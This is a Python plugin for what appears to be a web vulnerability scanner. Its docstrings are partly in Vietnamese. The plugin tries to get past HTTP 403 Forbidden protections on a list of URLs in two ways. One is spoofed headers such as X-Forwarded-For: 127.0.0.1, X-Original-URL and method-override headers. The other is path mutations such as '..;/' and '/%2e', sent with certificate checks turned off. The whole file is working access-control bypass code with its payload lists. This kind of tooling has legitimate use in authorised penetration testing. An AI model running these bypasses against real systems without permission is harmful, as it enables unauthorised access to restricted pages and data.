#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
from core.base_plugin import BasePlugin
from core.evidence import attach_evidence, make_evidence

class Bypass403Plugin(BasePlugin):
    """
    Plugin chuyên dụng Bypass 403 Forbidden bằng Header Manipulation,
    Path Mutation, và HTTP Method Overriding.
    """
    
    def name(self) -> str:
        return "Bypass403"

    def description(self) -> str:
        return "Bypass 403 Forbidden using header manipulation, path mutation, and HTTP Method Overriding."

    def check_installed(self) -> bool:
        return True

    def run(self, forbidden_urls: list, timeout: int = 10) -> list:
        """
        Thử bypass 403 Forbidden.
        Returns:
            list: [{"url": "...", "bypass_method": "...", "status": 200}]
        """
        bypassed = []
        
        BYPASS_HEADERS = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/{path}"},
            {"X-Rewrite-URL": "/{path}"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Host": "localhost"},
            {"Forwarded": "for=127.0.0.1;by=127.0.0.1;host=localhost"},
            # HTTP Method Overriding
            {"X-HTTP-Method-Override": "GET"},
            {"X-Original-Method": "GET"}
        ]
        
        PATH_MUTATIONS = [
            lambda p: p + "/",
            lambda p: p + "/.",
            lambda p: p + "..;/",
            lambda p: p + "%20",
            lambda p: p + "%09",
            lambda p: "/%2e" + p,
            lambda p: p.upper() if p != p.upper() else p,
            lambda p: p + "?",
            lambda p: p + "#",
            lambda p: p + ";",
        ]
        
        for url in forbidden_urls[:15]:
            url = url.strip()
            if not url:
                continue
                
            from urllib.parse import urlparse
            parsed = urlparse(url)
            path = parsed.path or "/"
            baseline_status = None
            try:
                baseline = requests.get(
                    url,
                    timeout=timeout,
                    verify=False,
                    headers={"User-Agent": "Mozilla/5.0"},
                    allow_redirects=False,
                )
                baseline_status = baseline.status_code
            except Exception:
                pass
            
            # Test bypass headers
            for bypass_header in BYPASS_HEADERS:
                header = {}
                for k, v in bypass_header.items():
                    header[k] = v.replace("{path}", path)
                header["User-Agent"] = "Mozilla/5.0"
                
                try:
                    # Đối với HTTP Method Overriding, gửi POST
                    method = "POST" if "X-HTTP-Method-Override" in header or "X-Original-Method" in header else "GET"
                    resp = requests.request(method, url, headers=header, timeout=timeout,
                                            verify=False, allow_redirects=False)
                    if resp.status_code in (200, 301, 302) and resp.status_code != baseline_status:
                        finding = {
                            "url": url,
                            "bypass_method": f"Header: {list(bypass_header.keys())[0]}",
                            "status": resp.status_code,
                            "baseline_status": baseline_status,
                            "severity": "high",
                            "confidence": "medium" if resp.status_code in (301, 302) else "high",
                        }
                        bypassed.append(attach_evidence(finding, make_evidence(
                            method=method,
                            url=url,
                            status_code=resp.status_code,
                            request_headers=header,
                            response_headers=dict(resp.headers),
                            response_snippet=resp.text,
                            validation=f"Baseline status {baseline_status}; bypass header changed response to {resp.status_code}",
                            confidence=finding["confidence"],
                        )))
                        break
                except Exception:
                    continue
            
            # Test path mutations
            for mutate in PATH_MUTATIONS[:5]:
                try:
                    mutated_path = mutate(path)
                    mutated_url = url.replace(path, mutated_path, 1)
                    resp = requests.get(mutated_url, timeout=timeout, verify=False,
                                        headers={"User-Agent": "Mozilla/5.0"},
                                        allow_redirects=False)
                    if resp.status_code in (200, 301, 302) and resp.status_code != baseline_status:
                        finding = {
                            "url": url,
                            "mutated_url": mutated_url,
                            "bypass_method": f"Path mutation: {mutated_path}",
                            "status": resp.status_code,
                            "baseline_status": baseline_status,
                            "severity": "high",
                            "confidence": "medium" if resp.status_code in (301, 302) else "high",
                        }
                        bypassed.append(attach_evidence(finding, make_evidence(
                            method="GET",
                            url=mutated_url,
                            status_code=resp.status_code,
                            request_headers={"User-Agent": "Mozilla/5.0"},
                            response_headers=dict(resp.headers),
                            response_snippet=resp.text,
                            validation=f"Baseline status {baseline_status}; path mutation changed response to {resp.status_code}",
                            confidence=finding["confidence"],
                        )))
                        break
                except Exception:
                    continue
        
        return bypassed
